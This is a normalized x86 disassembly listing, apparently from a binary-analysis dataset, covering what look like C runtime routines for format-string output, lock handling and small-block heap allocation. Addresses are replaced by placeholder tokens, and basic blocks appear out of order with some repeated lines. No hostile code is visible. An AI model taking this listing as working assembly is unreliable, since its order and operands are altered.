test [ ebp - 0x408 ] 0x40
mov eax [ ebx - 0x4 ]
je r-xdata
test [ ebp - 0x408 ] 0x40
mov [ ebp - 0x41c ] ebx
je r-xdata
test [ ebp - 0x408 ] 0x9000
mov ebx edx
mov edi eax
jne r-xdata
test edx edx
jg r-xdata
mov eax [ ebx ]
add ebx 0x4
mov [ ebp - 0x41c ] ebx
test eax eax
je r-xdata
sub eax ecx
je r-xdata
or [ ebp - 0x408 ] 0x20
add edx 0x20
mov [ ebp - 0x460 ] 0x1
mov [ ebp - 0x418 ] edx
sub eax edi
je r-xdata
cmp ax 0x75
je r-xdata
mov eax [ ebp - 0x410 ]
mov [ ebp - 0x428 ] 0x1
jmp r-xdata
mov eax [ rw-data ]
mov [ ebp - 0x410 ] eax
and [ ebp - 0x414 ] 0x0
mov esi [ ebp - 0x410 ]
test edi edi
jle r-xdata
mov eax [ rw-data ]
mov [ ebp - 0x410 ] eax
push [ ebp - 0x444 ]
call sub_4121b5
and [ ebp - 0x444 ] 0x0
mov ebx [ ebp - 0x42c ]
mov esi [ ebp - 0x414 ]
sub ebx esi
sub ebx [ ebp - 0x424 ]
test [ ebp - 0x408 ] 0xc
jne r-xdata
test eax 0x100
je r-xdata
jne r-xdata
mov [ ebp - 0x40c ] 0x6
jmp r-xdata
cmp eax 0x6e
je r-xdata
xor edx edx
cdq
jmp r-xdata
movzx eax [ ebx - 0x4 ]
movsx eax [ ebx - 0x4 ]
jmp r-xdata
cmp [ ebp - 0x40c ] 0x0
jge r-xdata
xor ebx ebx
jl r-xdata
mov eax [ rw-data ]
mov [ ebp - 0x410 ] eax
push eax
mov ecx [ eax + 0x4 ]
test ecx ecx
je r-xdata
sub eax edi
jne r-xdata
test [ ebp - 0x408 ] 0x830
jne r-xdata
sub eax edi
je r-xdata
cmp ax 0x78
je r-xdata
test edi edi
jne r-xdata
mov al [ esi ]
test al al
je r-xdata
push [ ebp - 0x424 ]
mov edi [ ebp - 0x430 ]
lea eax [ ebp - 0x420 ]
lea ecx [ ebp - 0x438 ]
call sub_419233
test [ ebp - 0x408 ] 0x8
pop ecx
je r-xdata
push [ ebp - 0x430 ]
lea eax [ ebp - 0x420 ]
push ebx
push 0x20
call sub_41920c
add esp 0xc
test al 0x1
je r-xdata
push 0x2d
jmp r-xdata
cmp [ ebp - 0x40c ] eax
jle r-xdata
cmp dx 0x67
jne r-xdata
mov eax [ ebx ]
add ebx 0x8
mov [ ebp - 0x46c ] eax
mov eax [ ebx - 0x4 ]
mov [ ebp - 0x468 ] eax
lea eax [ ebp - 0x458 ]
push eax
push [ ebp - 0x460 ]
movsx eax dl
push [ ebp - 0x40c ]
mov [ ebp - 0x41c ] ebx
push eax
push [ ebp - 0x414 ]
lea eax [ ebp - 0x46c ]
push esi
push eax
push [ rw-data ]
call sub_417df1
pop ecx
call eax
mov ebx [ ebp - 0x408 ]
add esp 0x1c
and ebx 0x80
je r-xdata
mov esi [ ebx ]
add ebx 0x4
mov [ ebp - 0x41c ] ebx
call sub_421fe1
test eax eax
je r-xdata
cmp eax 0x6f
jne r-xdata
test [ ebp - 0x408 ] 0x40
je r-xdata
cdq
jmp r-xdata
and [ ebp - 0x408 ] 0xfffffff7
mov eax 0x200
cmp [ ebp - 0x40c ] eax
jle r-xdata
mov [ ebp - 0x40c ] 0x1
jmp r-xdata
neg eax
adc edx 0x0
neg edx
or [ ebp - 0x408 ] 0x100
test eax eax
jae r-xdata
mov [ ebp - 0x414 ] eax
test [ ebp - 0x408 ] 0x800
movsx eax [ eax ]
mov [ ebp - 0x410 ] ecx
je r-xdata
movzx eax [ ebx ]
add ebx 0x4
xor esi esi
inc esi
test [ ebp - 0x408 ] 0x20
mov [ ebp - 0x428 ] esi
mov [ ebp - 0x41c ] ebx
mov [ ebp - 0x464 ] eax
je r-xdata
or [ ebp - 0x408 ] 0x20
jmp r-xdata
sub eax edi
jne r-xdata
cmp ax 0x58
je r-xdata
dec edi
cmp [ eax ] 0x0
je r-xdata
sub eax [ ebp - 0x410 ]
lea ecx [ ebp - 0x458 ]
movzx eax al
push ecx
push eax
call sub_422128
pop ecx
pop ecx
test eax eax
je r-xdata
cmp [ ebp - 0x428 ] 0x0
jne r-xdata
test [ ebp - 0x408 ] 0x4
jne r-xdata
test al 0x2
je r-xdata
push 0x2b
jmp r-xdata
pop eax
mov [ ebp - 0x438 ] ax
mov [ ebp - 0x424 ] 0x1
cmp [ ebp - 0x40c ] 0xa3
jle r-xdata
mov [ ebp - 0x40c ] eax
mov [ ebp - 0x40c ] 0x1
jmp r-xdata
cmp [ ebp - 0x418 ] 0x67
jne r-xdata
cmp [ ebp - 0x40c ] 0x0
jne r-xdata
call sub_4119bb
mov [ eax ] 0x16
xor eax eax
push eax
push eax
push eax
push eax
push eax
jmp r-xdata
test [ ebp - 0x408 ] 0x20
je r-xdata
test [ ebp - 0x408 ] 0x80
mov [ ebp - 0x418 ] 0x8
je r-xdata
mov eax edi
or eax ebx
jne r-xdata
mov [ ebp - 0x40c ] eax
and [ ebp - 0x428 ] 0x0
jmp r-xdata
cdq
sub eax edx
mov [ ebp - 0x428 ] 0x1
jmp r-xdata
mov [ ebp - 0x404 ] ax
mov [ ebp - 0x434 ] al
lea eax [ ebp - 0x458 ]
push eax
mov eax [ ebp - 0x458 ]
mov [ ebp - 0x433 ] 0x0
push [ eax + 0xac ]
lea eax [ ebp - 0x434 ]
push eax
lea eax [ ebp - 0x404 ]
push eax
call sub_421ff7
add esp 0x10
test eax eax
jge r-xdata
and [ ebp - 0x45c ] 0x0
inc eax
inc eax
inc esi
inc [ ebp - 0x414 ]
cmp [ ebp - 0x414 ] edi
jl r-xdata
inc esi
mov ecx [ ebp - 0x410 ]
push esi
lea eax [ ebp - 0x420 ]
call sub_419233
pop ecx
test esi esi
jle r-xdata
push edi
push ebx
push 0x30
lea eax [ ebp - 0x420 ]
call sub_41920c
add esp 0xc
push 0x20
mov edi [ ebp - 0x40c ]
add edi 0x15d
push edi
call sub_418672
mov edx [ ebp - 0x418 ]
pop ecx
mov [ ebp - 0x444 ] eax
test eax eax
je r-xdata
cmp [ esi ] 0x2d
jne r-xdata
test ebx ebx
jne r-xdata
lea eax [ ebp - 0x458 ]
push eax
push esi
push [ rw-data ]
call sub_417df1
pop ecx
call eax
pop ecx
pop ecx
call sub_41897d
add esp 0x14
cmp [ ebp - 0x44c ] 0x0
je r-xdata
mov eax [ ebp - 0x420 ]
mov [ esi ] eax
mov ax [ ebp - 0x420 ]
mov [ esi ] ax
jmp r-xdata
or [ ebp - 0x408 ] 0x200
jmp r-xdata
lea esi [ ebp - 0x205 ]
and [ ebp - 0x424 ] eax
sar eax 0x1
lea eax [ ebp - 0x404 ]
mov [ ebp - 0x410 ] eax
mov [ ebp - 0x414 ] esi
jmp r-xdata
mov [ ebp - 0x43c ] esi
jmp r-xdata
jmp r-xdata
test [ ebp - 0x408 ] 0x4
je r-xdata
mov edi [ ebp - 0x410 ]
mov [ ebp - 0x418 ] esi
mov [ ebp - 0x40c ] 0xa3
mov [ ebp - 0x410 ] eax
mov [ ebp - 0x414 ] edi
mov esi eax
jmp r-xdata
push esi
jmp r-xdata
or [ ebp - 0x408 ] 0x100
inc esi
mov [ ebp - 0x410 ] esi
lea eax [ ebp - 0x458 ]
push eax
push esi
push [ rw-data ]
call sub_417df1
pop ecx
call eax
pop ecx
pop ecx
mov [ ebp - 0x43c ] 0x1
jmp r-xdata
mov eax [ ebp - 0x418 ]
cdq
push edx
push eax
push ebx
push edi
call sub_422180
add ecx 0x30
cmp ecx 0x39
mov [ ebp - 0x470 ] ebx
mov edi eax
mov ebx edx
jle r-xdata
mov eax edi
or eax ebx
je r-xdata
push [ ebp - 0x430 ]
lea eax [ ebp - 0x420 ]
push ebx
push 0x20
call sub_41920c
add esp 0xc
or [ ebp - 0x420 ] 0xffffffff
jmp r-xdata
push [ ebp - 0x464 ]
mov eax [ ebp - 0x430 ]
lea esi [ ebp - 0x420 ]
call sub_4191dd
add edi [ ebp - 0x470 ]
cmp [ ebp - 0x418 ] 0x0
pop ecx
jg r-xdata
call sub_412e40
pop ecx
jmp r-xdata
mov [ esi ] cl
dec esi
jmp r-xdata
add ecx [ ebp - 0x448 ]
lea eax [ ebp - 0x205 ]
sub eax esi
inc esi
test [ ebp - 0x408 ] 0x200
mov [ ebp - 0x414 ] eax
mov [ ebp - 0x410 ] esi
je r-xdata
cmp [ ebp - 0x420 ] 0x0
jl r-xdata
dec [ ebp - 0x418 ]
lea eax [ ebp - 0x458 ]
push eax
mov eax [ ebp - 0x458 ]
push [ eax + 0xac ]
lea eax [ ebp - 0x464 ]
push edi
push eax
call sub_421ff7
add esp 0x10
mov [ ebp - 0x470 ] eax
test eax eax
jle r-xdata
jmp r-xdata
mov eax [ ebp - 0x40c ]
dec [ ebp - 0x40c ]
test eax eax
jg r-xdata
test eax eax
je r-xdata
dec [ ebp - 0x410 ]
mov ecx [ ebp - 0x410 ]
mov [ ecx ] 0x30
inc eax
jmp r-xdata
mov ecx esi
cmp [ ecx ] 0x30
je r-xdata
sub_419e1d
mov edi edi
push esi
push edi
xor esi esi
mov edi rw-data
inc esi
cmp esi 0x24
jl r-xdata
lea eax [ esi * 8 + rw-data ]
mov [ eax ] edi
push 0xfa0
push [ eax ]
add edi 0x18
call sub_420b79
pop ecx
pop ecx
test eax eax
je r-xdata
cmp [ esi * 8 + rw-data ] 0x1
jne r-xdata
xor eax eax
inc eax
and [ esi * 8 + rw-data ] 0x0
xor eax eax
jmp r-xdata
pop edi
pop esi
retn
sub_419e68
mov edi edi
push ebx
mov ebx [ DeleteCriticalSection@IAT ]
push esi
mov esi rw-data
push edi
add esi 0x8
cmp esi rw-data
jl r-xdata
cmp [ esi + 0x4 ] 0x1
je r-xdata
mov edi [ esi ]
test edi edi
je r-xdata
mov esi rw-data
pop edi
push edi
call ebx
push edi
call sub_4121b5
and [ esi ] 0x0
pop ecx
add esi 0x8
cmp esi rw-data
jl r-xdata
cmp [ esi + 0x4 ] 0x1
jne r-xdata
mov eax [ esi ]
test eax eax
je r-xdata
pop esi
pop ebx
retn
push eax
call ebx
sub_419ed6
push 0xc
push r--data
call sub_4183f0
xor edi edi
inc edi
mov [ ebp - 0x1c ] edi
xor ebx ebx
cmp [ rw-data ] ebx
jne r-xdata
mov esi [ ebp + 0x8 ]
lea esi [ esi * 8 + rw-data ]
cmp [ esi ] ebx
je r-xdata
call sub_417602
push 0x1e
call sub_417457
push 0xff
call sub_416f71
push 0x18
call sub_418672
pop ecx
mov edi eax
cmp edi ebx
jne r-xdata
mov eax edi
jmp r-xdata
push 0xa
call sub_419f99
pop ecx
mov [ ebp - 0x4 ] ebx
cmp [ esi ] ebx
jne r-xdata
call sub_4119bb
mov [ eax ] 0xc
xor eax eax
jmp r-xdata
call sub_418435
retn
push edi
call sub_4121b5
pop ecx
push 0xfa0
push edi
call sub_420b79
pop ecx
pop ecx
test eax eax
jne r-xdata
mov [ esi ] edi
jmp r-xdata
push edi
call sub_4121b5
pop ecx
call sub_4119bb
mov [ eax ] 0xc
mov [ ebp - 0x1c ] ebx
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_419f90
mov eax [ ebp - 0x1c ]
sub_419f99
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
lea esi [ eax * 8 + rw-data ]
cmp [ esi ] 0x0
jne r-xdata
push [ esi ]
call [ EnterCriticalSection@IAT ]
pop esi
pop ebp
retn
push eax
call sub_419ed6
pop ecx
test eax eax
jne r-xdata
push 0x11
call sub_416f1d
pop ecx
sub_419fcc
mov edi edi
push ebp
mov ebp esp
mov ecx [ rw-data ]
mov eax [ rw-data ]
imul ecx ecx 0x14
add ecx eax
jmp r-xdata
cmp eax ecx
jb r-xdata
mov edx [ ebp + 0x8 ]
sub edx [ eax + 0xc ]
cmp edx 0x100000
jb r-xdata
xor eax eax
pop ebp
retn
add eax 0x14
sub_419ffc
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
mov ecx [ ebp + 0x8 ]
mov eax [ ecx + 0x10 ]
push esi
mov esi [ ebp + 0xc ]
push edi
mov edi esi
sub edi [ ecx + 0xc ]
add esi 0xfffffffc
shr edi 0xf
mov ecx edi
imul ecx ecx 0x204
lea ecx [ ecx + eax + 0x144 ]
mov [ ebp - 0x10 ] ecx
mov ecx [ esi ]
dec ecx
mov [ ebp - 0x4 ] ecx
test cl 0x1
jne r-xdata
pop edi
pop esi
leave
retn
push ebx
lea ebx [ ecx + esi ]
mov edx [ ebx ]
mov [ ebp - 0xc ] edx
mov edx [ esi - 0x4 ]
mov [ ebp - 0x8 ] edx
mov edx [ ebp - 0xc ]
mov [ ebp + 0xc ] ebx
test dl 0x1
jne r-xdata
mov edx ecx
sar edx 0x4
dec edx
cmp edx 0x3f
jbe r-xdata
sar edx 0x4
dec edx
cmp edx 0x3f
jbe r-xdata
mov ebx [ ebp - 0x8 ]
and ebx 0x1
mov [ ebp - 0xc ] ebx
jne r-xdata
push 0x3f
pop edx
mov ecx [ ebx + 0x4 ]
cmp ecx [ ebx + 0x8 ]
jne r-xdata
push 0x3f
pop edx
mov ebx [ ebp + 0x8 ]
sub esi [ ebp - 0x8 ]
mov ebx [ ebp - 0x8 ]
sar ebx 0x4
push 0x3f
mov [ ebp + 0xc ] esi
dec ebx
pop esi
cmp ebx esi
jbe r-xdata
mov edx [ ebx + 0x8 ]
mov ebx [ ebx + 0x4 ]
mov ecx [ ebp - 0x4 ]
add ecx [ ebp - 0xc ]
mov [ edx + 0x4 ] ebx
mov edx [ ebp + 0xc ]
mov ebx [ edx + 0x4 ]
mov edx [ edx + 0x8 ]
mov [ ebx + 0x8 ] edx
mov [ ebp - 0x4 ] ecx
mov ebx 0x80000000
cmp edx 0x20
jae r-xdata
mov ecx [ ebp - 0x10 ]
lea ecx [ ecx + edx * 8 ]
mov ebx [ ecx + 0x4 ]
mov [ esi + 0x8 ] ecx
mov [ esi + 0x4 ] ebx
mov [ ecx + 0x4 ] esi
mov ecx [ esi + 0x4 ]
mov [ ecx + 0x8 ] esi
mov ecx [ esi + 0x4 ]
cmp ecx [ esi + 0x8 ]
jne r-xdata
cmp ebx edx
je r-xdata
add ecx [ ebp - 0x8 ]
mov edx ecx
sar edx 0x4
dec edx
mov [ ebp - 0x4 ] ecx
cmp edx esi
jbe r-xdata
mov ebx esi
lea ecx [ edx - 0x20 ]
shr ebx cl
lea ecx [ edx + eax + 0x4 ]
not ebx
and [ eax + edi * 4 + 0xc4 ] ebx
dec [ ecx ]
jne r-xdata
mov ecx edx
shr ebx cl
lea ecx [ edx + eax + 0x4 ]
not ebx
and [ eax + edi * 4 + 0x44 ] ebx
dec [ ecx ]
jne r-xdata
mov eax [ ebp - 0x4 ]
mov [ esi ] eax
mov [ eax + esi - 0x4 ] eax
mov eax [ ebp - 0x10 ]
dec [ eax ]
jne r-xdata
mov cl [ edx + eax + 0x4 ]
mov [ ebp + 0xf ] cl
inc cl
mov [ edx + eax + 0x4 ] cl
cmp edx 0x20
jae r-xdata
cmp ebx edx
je r-xdata
mov edx esi
mov ebx [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
and [ ecx + 0x4 ] ebx
mov ecx [ ebp + 0x8 ]
and [ ecx ] ebx
jmp r-xdata
pop ebx
mov eax [ rw-data ]
test eax eax
je r-xdata
cmp [ ebp + 0xf ] 0x0
jne r-xdata
cmp [ ebp + 0xf ] 0x0
jne r-xdata
mov esi [ ebp + 0xc ]
jmp r-xdata
mov ecx [ ebp + 0xc ]
mov esi [ ecx + 0x4 ]
cmp esi [ ecx + 0x8 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
mov [ rw-data ] edi
mov ecx [ rw-data ]
mov esi [ VirtualFree@IAT ]
push 0x4000
shl ecx 0xf
add ecx [ eax + 0xc ]
mov ebx 0x8000
push ebx
push ecx
call esi
mov ecx [ rw-data ]
mov eax [ rw-data ]
mov edx 0x80000000
shr edx cl
or [ eax + 0x8 ] edx
mov eax [ rw-data ]
mov eax [ eax + 0x10 ]
mov ecx [ rw-data ]
and [ eax + ecx * 4 + 0xc4 ] 0x0
mov eax [ rw-data ]
mov eax [ eax + 0x10 ]
dec [ eax + 0x43 ]
mov eax [ rw-data ]
mov ecx [ eax + 0x10 ]
cmp [ ecx + 0x43 ] 0x0
jne r-xdata
lea ecx [ edx - 0x20 ]
mov edx 0x80000000
shr edx cl
lea eax [ eax + edi * 4 + 0xc4 ]
or [ eax ] edx
lea ecx [ edx - 0x20 ]
mov ebx 0x80000000
shr ebx cl
mov ecx [ ebp + 0x8 ]
or [ ecx + 0x4 ] ebx
mov ebx 0x80000000
mov ecx edx
shr ebx cl
lea eax [ eax + edi * 4 + 0x44 ]
or [ eax ] ebx
jmp r-xdata
mov ecx edx
mov ebx 0x80000000
shr ebx cl
mov ecx [ ebp + 0x8 ]
or [ ecx ] ebx
cmp [ ebp - 0xc ] 0x0
jne r-xdata
mov ecx [ ebp + 0xc ]
mov esi [ ecx + 0x8 ]
mov ecx [ ecx + 0x4 ]
mov [ esi + 0x4 ] ecx
mov ecx [ ebp + 0xc ]
mov esi [ ecx + 0x4 ]
mov ecx [ ecx + 0x8 ]
mov [ esi + 0x8 ] ecx
mov esi 0x80000000
cmp ebx 0x20
jae r-xdata
cmp [ eax + 0x8 ] 0xffffffff
jne r-xdata
and [ eax + 0x4 ] 0xfffffffe
mov eax [ rw-data ]
lea ecx [ ebx - 0x20 ]
shr esi cl
not esi
and [ eax + edi * 4 + 0xc4 ] esi
dec [ ebx + eax + 0x4 ]
jne r-xdata
mov ecx ebx
shr esi cl
not esi
and [ eax + edi * 4 + 0x44 ] esi
dec [ ebx + eax + 0x4 ]
jne r-xdata
push ebx
push 0x0
push [ eax + 0xc ]
call esi
mov eax [ rw-data ]
push [ eax + 0x10 ]
push 0x0
push [ rw-data ]
call [ HeapFree@IAT ]
mov ecx [ rw-data ]
mov eax [ rw-data ]
imul ecx ecx 0x14
mov edx [ rw-data ]
sub ecx eax
lea ecx [ ecx + edx - 0x14 ]
push ecx
lea ecx [ eax + 0x14 ]
push ecx
push eax
call sub_422220
mov eax [ ebp + 0x8 ]
add esp 0xc
dec [ rw-data ]
cmp eax [ rw-data ]
jbe r-xdata
mov ecx [ ebp + 0x8 ]
and [ ecx + 0x4 ] esi
mov ecx [ ebp + 0x8 ]
and [ ecx ] esi
jmp r-xdata
mov eax [ rw-data ]
mov [ rw-data ] eax
sub [ ebp + 0x8 ] 0x14
sub_41a312
mov eax [ rw-data ]
push esi
mov esi [ rw-data ]
push edi
xor edi edi
cmp esi eax
jne r-xdata
imul esi esi 0x14
add esi [ rw-data ]
push 0x41c4
push 0x8
push [ rw-data ]
call [ HeapAlloc@IAT ]
mov [ esi + 0x10 ] eax
cmp eax edi
je r-xdata
add eax 0x10
imul eax eax 0x14
push eax
push [ rw-data ]
push edi
push [ rw-data ]
call [ HeapReAlloc@IAT ]
cmp eax edi
jne r-xdata
xor eax eax
jmp r-xdata
push 0x4
push 0x2000
push 0x100000
push edi
call [ VirtualAlloc@IAT ]
mov [ esi + 0xc ] eax
cmp eax edi
jne r-xdata
add [ rw-data ] 0x10
mov esi [ rw-data ]
mov [ rw-data ] eax
pop edi
pop esi
retn
or [ esi + 0x8 ] 0xffffffff
mov [ esi ] edi
mov [ esi + 0x4 ] edi
inc [ rw-data ]
mov eax [ esi + 0x10 ]
or [ eax ] 0xffffffff
mov eax esi
push [ esi + 0x10 ]
push edi
push [ rw-data ]
call [ HeapFree@IAT ]
jmp r-xdata
sub_41a3c2
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
mov ecx [ ebp + 0x8 ]
mov eax [ ecx + 0x8 ]
push ebx
push esi
mov esi [ ecx + 0x10 ]
push edi
xor ebx ebx
jmp r-xdata
test eax eax
jge r-xdata
add eax eax
inc ebx
mov eax ebx
imul eax eax 0x204
lea eax [ eax + esi + 0x144 ]
push 0x3f
mov [ ebp - 0x8 ] eax
pop edx
mov [ eax + 0x8 ] eax
mov [ eax + 0x4 ] eax
add eax 0x8
dec edx
jne r-xdata
push 0x4
mov edi ebx
push 0x1000
shl edi 0xf
add edi [ ecx + 0xc ]
push 0x8000
push edi
call [ VirtualAlloc@IAT ]
test eax eax
jne r-xdata
lea edx [ edi + 0x7000 ]
mov [ ebp - 0x4 ] edx
cmp edi edx
ja r-xdata
or eax 0xffffffff
jmp r-xdata
mov eax [ ebp - 0x8 ]
add eax 0x1f8
lea ecx [ edi + 0xc ]
mov [ eax + 0x4 ] ecx
mov [ ecx + 0x8 ] eax
lea ecx [ edx + 0xc ]
mov [ eax + 0x8 ] ecx
mov [ ecx + 0x4 ] eax
and [ esi + ebx * 4 + 0x44 ] 0x0
xor edi edi
inc edi
mov [ esi + ebx * 4 + 0xc4 ] edi
mov al [ esi + 0x43 ]
mov cl al
inc cl
test al al
mov eax [ ebp + 0x8 ]
mov [ esi + 0x43 ] cl
jne r-xdata
mov ecx edx
sub ecx edi
shr ecx 0xc
lea eax [ edi + 0x10 ]
inc ecx
pop edi
pop esi
pop ebx
leave
retn
mov edx 0x80000000
mov ecx ebx
shr edx cl
not edx
and [ eax + 0x8 ] edx
mov eax ebx
or [ eax + 0x4 ] edi
or [ eax - 0x8 ] 0xffffffff
or [ eax + 0xfec ] 0xffffffff
lea edx [ eax + 0xffc ]
mov [ eax ] edx
lea edx [ eax - 0x1004 ]
mov [ eax - 0x4 ] 0xff0
mov [ eax + 0x4 ] edx
mov [ eax + 0xfe8 ] 0xff0
add eax 0x1000
dec ecx
jne r-xdata
mov edx [ ebp - 0x4 ]
sub_41a4ca
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
mov ecx [ ebp + 0x8 ]
mov eax [ ecx + 0x10 ]
push ebx
push esi
mov esi [ ebp + 0x10 ]
push edi
mov edi [ ebp + 0xc ]
mov edx edi
sub edx [ ecx + 0xc ]
add esi 0x17
shr edx 0xf
mov ecx edx
imul ecx ecx 0x204
lea ecx [ ecx + eax + 0x144 ]
mov [ ebp - 0xc ] ecx
mov ecx [ edi - 0x4 ]
and esi 0xfffffff0
dec ecx
cmp esi ecx
lea edi [ ecx + edi - 0x4 ]
mov ebx [ edi ]
mov [ ebp + 0x10 ] ecx
mov [ ebp - 0x4 ] ebx
jle r-xdata
jge r-xdata
test bl 0x1
jne r-xdata
xor eax eax
inc eax
mov ebx [ ebp + 0xc ]
sub [ ebp + 0x10 ] esi
lea ecx [ esi + 0x1 ]
mov [ ebx - 0x4 ] ecx
lea ebx [ ebx + esi - 0x4 ]
mov esi [ ebp + 0x10 ]
sar esi 0x4
dec esi
mov [ ebp + 0xc ] ebx
mov [ ebx - 0x4 ] ecx
cmp esi 0x3f
jbe r-xdata
xor eax eax
jmp r-xdata
add ebx ecx
cmp esi ebx
jg r-xdata
test [ ebp - 0x4 ] 0x1
jne r-xdata
push 0x3f
pop esi
pop edi
pop esi
pop ebx
leave
retn
mov ecx [ ebp - 0x4 ]
sar ecx 0x4
dec ecx
mov [ ebp - 0x8 ] ecx
cmp ecx 0x3f
jbe r-xdata
mov ecx [ ebp - 0xc ]
lea ecx [ ecx + esi * 8 ]
mov edi [ ecx + 0x4 ]
mov [ ebx + 0x8 ] ecx
mov [ ebx + 0x4 ] edi
mov [ ecx + 0x4 ] ebx
mov ecx [ ebx + 0x4 ]
mov [ ecx + 0x8 ] ebx
mov ecx [ ebx + 0x4 ]
cmp ecx [ ebx + 0x8 ]
jne r-xdata
mov esi [ ebp - 0x4 ]
sar esi 0x4
dec esi
cmp esi 0x3f
jbe r-xdata
mov ebx [ edi + 0x4 ]
cmp ebx [ edi + 0x8 ]
jne r-xdata
push 0x3f
pop ecx
mov [ ebp - 0x8 ] ecx
mov eax [ ebp + 0x10 ]
mov [ ebx ] eax
mov [ eax + ebx - 0x4 ] eax
mov cl [ esi + eax + 0x4 ]
mov [ ebp + 0xf ] cl
inc cl
mov [ esi + eax + 0x4 ] cl
cmp esi 0x20
jae r-xdata
mov ecx [ edi + 0x4 ]
cmp ecx [ edi + 0x8 ]
jne r-xdata
push 0x3f
pop esi
mov ecx [ edi + 0x8 ]
mov ebx [ edi + 0x4 ]
mov [ ecx + 0x4 ] ebx
mov ecx [ edi + 0x4 ]
mov edi [ edi + 0x8 ]
mov [ ecx + 0x8 ] edi
mov ecx [ ebp + 0x10 ]
sub ecx esi
add [ ebp - 0x4 ] ecx
cmp [ ebp - 0x4 ] 0x0
jle r-xdata
mov ebx 0x80000000
cmp ecx 0x20
jae r-xdata
cmp [ ebp + 0xf ] 0x0
jne r-xdata
cmp [ ebp + 0xf ] 0x0
jne r-xdata
mov ecx [ edi + 0x8 ]
mov esi [ edi + 0x4 ]
mov [ ecx + 0x4 ] esi
mov esi [ edi + 0x8 ]
mov ecx [ edi + 0x4 ]
mov [ ecx + 0x8 ] esi
mov esi [ ebp + 0x10 ]
add esi [ ebp - 0x4 ]
mov [ ebp + 0x10 ] esi
sar esi 0x4
dec esi
cmp esi 0x3f
jbe r-xdata
mov ebx 0x80000000
cmp esi 0x20
jae r-xdata
mov edx [ ebp + 0xc ]
mov edi [ ebp - 0x4 ]
mov ecx [ ebp + 0xc ]
sar edi 0x4
dec edi
lea ecx [ ecx + esi - 0x4 ]
cmp edi 0x3f
jbe r-xdata
add ecx 0xffffffe0
shr ebx cl
mov ecx [ ebp - 0x8 ]
lea ecx [ ecx + eax + 0x4 ]
not ebx
and [ eax + edx * 4 + 0xc4 ] ebx
dec [ ecx ]
jne r-xdata
shr ebx cl
mov ecx [ ebp - 0x8 ]
lea ecx [ ecx + eax + 0x4 ]
not ebx
and [ eax + edx * 4 + 0x44 ] ebx
dec [ ecx ]
jne r-xdata
lea eax [ eax + edx * 4 + 0xc4 ]
lea ecx [ esi - 0x20 ]
lea ecx [ esi - 0x20 ]
mov edi 0x80000000
shr edi cl
mov ecx [ ebp + 0x8 ]
or [ ecx + 0x4 ] edi
lea eax [ eax + edx * 4 + 0x44 ]
mov ecx esi
jmp r-xdata
mov ecx esi
mov edi 0x80000000
shr edi cl
mov ecx [ ebp + 0x8 ]
or [ ecx ] edi
push 0x3f
pop esi
lea ecx [ esi - 0x20 ]
shr ebx cl
lea ecx [ esi + eax + 0x4 ]
not ebx
and [ eax + edx * 4 + 0xc4 ] ebx
dec [ ecx ]
jne r-xdata
mov ecx esi
shr ebx cl
lea esi [ esi + eax + 0x4 ]
not ebx
and [ eax + edx * 4 + 0x44 ] ebx
dec [ esi ]
jne r-xdata
mov ebx [ ebp - 0xc ]
lea ebx [ ebx + edi * 8 ]
mov [ ebp + 0x10 ] ebx
mov ebx [ ebx + 0x4 ]
mov [ ecx + 0x4 ] ebx
mov ebx [ ebp + 0x10 ]
mov [ ecx + 0x8 ] ebx
mov [ ebx + 0x4 ] ecx
mov ebx [ ecx + 0x4 ]
mov [ ebx + 0x8 ] ecx
mov ebx [ ecx + 0x4 ]
cmp ebx [ ecx + 0x8 ]
jne r-xdata
push 0x3f
pop edi
mov ecx [ ebp + 0x8 ]
and [ ecx + 0x4 ] ebx
mov ecx [ ebp + 0x8 ]
and [ ecx ] ebx
jmp r-xdata
mov edx 0x80000000
shr edx cl
or [ eax ] edx
mov ebx [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
and [ ecx + 0x4 ] ebx
mov ecx [ ebp + 0x8 ]
and [ ecx ] ebx
jmp r-xdata
mov edx [ ebp + 0xc ]
mov ecx [ ebp - 0x4 ]
lea eax [ edx + esi - 0x4 ]
mov [ eax ] ecx
mov [ ecx + eax - 0x4 ] ecx
jmp r-xdata
mov cl [ edi + eax + 0x4 ]
mov [ ebp + 0x13 ] cl
inc cl
mov [ edi + eax + 0x4 ] cl
cmp edi 0x20
jae r-xdata
lea eax [ esi + 0x1 ]
mov [ edx - 0x4 ] eax
mov [ edx + esi - 0x8 ] eax
jmp r-xdata
cmp [ ebp + 0x13 ] 0x0
jne r-xdata
cmp [ ebp + 0x13 ] 0x0
jne r-xdata
lea eax [ eax + edx * 4 + 0xc4 ]
lea ecx [ edi - 0x20 ]
lea ecx [ edi - 0x20 ]
mov ebx 0x80000000
shr ebx cl
mov ecx [ ebp + 0x8 ]
or [ ecx + 0x4 ] ebx
lea eax [ eax + edx * 4 + 0x44 ]
mov ecx edi
jmp r-xdata
mov ecx edi
mov ebx 0x80000000
shr ebx cl
mov ecx [ ebp + 0x8 ]
or [ ecx ] ebx
mov edx 0x80000000
shr edx cl
or [ eax ] edx
sub_41a7ab
mov edi edi
push ebp
mov ebp esp
sub esp 0x14
mov eax [ rw-data ]
mov ecx [ ebp + 0x8 ]
imul eax eax 0x14
add eax [ rw-data ]
add ecx 0x17
and ecx 0xfffffff0
mov [ ebp - 0x10 ] ecx
sar ecx 0x4
push ebx
dec ecx
cmp ecx 0x20
push esi
push edi
jge r-xdata
add ecx 0xffffffe0
or edx 0xffffffff
xor esi esi
shr edx cl
mov [ ebp - 0x8 ] edx
or esi 0xffffffff
shr esi cl
or [ ebp - 0x8 ] 0xffffffff
jmp r-xdata
mov [ ebp + 0x8 ] ebx
cmp ebx eax
jb r-xdata
mov ecx [ rw-data ]
mov ebx ecx
jmp r-xdata
mov edx [ ebx + 0x4 ]
mov edi [ ebx ]
and edx [ ebp - 0x8 ]
and edi esi
or edx edi
jne r-xdata
cmp ebx eax
jne r-xdata
add ebx 0x14
mov [ rw-data ] ebx
mov eax [ ebx + 0x10 ]
mov edx [ eax ]
mov [ ebp - 0x4 ] edx
cmp edx 0xffffffff
je r-xdata
mov ebx [ rw-data ]
jmp r-xdata
and [ ebp - 0x4 ] 0x0
mov edx [ eax + 0xc4 ]
